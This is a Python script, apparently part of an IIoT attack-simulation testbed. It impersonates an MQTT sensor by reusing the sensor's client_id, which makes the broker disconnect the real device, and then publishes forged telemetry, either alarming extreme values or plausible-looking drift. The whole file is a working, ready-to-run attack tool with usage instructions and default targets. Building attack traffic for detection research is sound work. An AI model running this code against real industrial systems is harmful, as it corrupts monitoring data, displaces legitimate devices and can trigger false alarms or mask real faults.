#!/usr/bin/env python3
"""
MITM — Sensor Impersonation. The attacker connects to the MQTT broker
using the SAME client_id as a legitimate sensor and publishes FAKE
telemetry under that sensor's topic. The cloud receives the fake data
believing it comes from the real device — a data-integrity attack on
the IIoT pipeline.

This is one of the three MITM-family techniques in the DataSense matrix
(alongside ARP Spoofing and IP Spoofing).

Usage:
  python impersonate.py <broker_ip> <duration_secs>
                        [sensor_id] [topic_prefix] [extreme_value]

Defaults: broker=192.168.1.193 duration=30 sensor=weather_01
          topic_prefix=iiot/weather extreme=True
"""
import sys, time, json, random
import paho.mqtt.client as mqtt

broker        = sys.argv[1]
duration      = int(sys.argv[2])
sensor_id     = sys.argv[3] if len(sys.argv) > 3 else "weather_01"
topic_prefix  = sys.argv[4] if len(sys.argv) > 4 else "iiot/weather"
extreme       = (sys.argv[5].lower() == "true") if len(sys.argv) > 5 else True

topic = f"{topic_prefix}/{sensor_id}"

print(f"[impersonate] ★ HIJACKING IDENTITY", flush=True)
print(f"[impersonate]   broker     = {broker}:1883", flush=True)
print(f"[impersonate]   client_id  = {sensor_id}  ← same as legitimate sensor", flush=True)
print(f"[impersonate]   topic      = {topic}", flush=True)
print(f"[impersonate]   duration   = {duration}s", flush=True)
print(f"[impersonate]   payload    = {'EXTREME (95-100C, 0% hum)' if extreme else 'subtle drift'}", flush=True)

# By using the legitimate sensor's client_id, mosquitto disconnects the
# REAL sensor (duplicate client_id conflict) — the attacker becomes the
# only source of data on that topic.
client = mqtt.Client(client_id=sensor_id)
try:
    client.connect(broker, 1883, 60)
    client.loop_start()
except Exception as e:
    print(f"[impersonate] ERROR connecting to broker: {e}", flush=True)
    sys.exit(1)

print(f"[impersonate] connected — legitimate sensor '{sensor_id}' now "
      f"disconnected by broker (duplicate client_id conflict)", flush=True)

end = time.time() + duration
n = 0
while time.time() < end:
    if extreme:
        # Suspicious/critical fake values — alarms the SOC
        payload = {
            "temperature": round(random.uniform(95, 100), 2),
            "humidity":    round(random.uniform(0, 5), 2),
            "pressure":    0,
            "sensor_id":   sensor_id,
            "timestamp":   time.time(),
        }
    else:
        # Subtle drift — looks plausible but wrong
        payload = {
            "temperature": round(random.uniform(60, 65), 2),
            "humidity":    round(random.uniform(20, 25), 2),
            "pressure":    1013,
            "sensor_id":   sensor_id,
            "timestamp":   time.time(),
        }
    client.publish(topic, json.dumps(payload), qos=0)
    n += 1
    if n % 5 == 1:
        print(f"  [#{n:03d}] published as '{sensor_id}'  →  {payload}", flush=True)
    time.sleep(1)

client.loop_stop()
client.disconnect()
print(f"[impersonate] FINISHED — {n} fake messages published as '{sensor_id}' "
      f"on topic '{topic}'. The cloud received {n} forged telemetry events.",
      flush=True)
